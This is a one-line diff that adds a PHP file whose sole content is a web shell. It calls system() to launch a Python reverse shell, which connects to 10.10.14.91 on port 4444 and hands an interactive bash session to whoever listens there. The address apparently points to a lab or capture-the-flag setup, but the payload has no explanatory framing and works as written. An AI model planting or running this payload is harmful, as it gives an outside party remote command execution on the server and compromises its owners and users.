@@ -1,0 +1,1 @@
+<?php system("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.91\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"); ?>
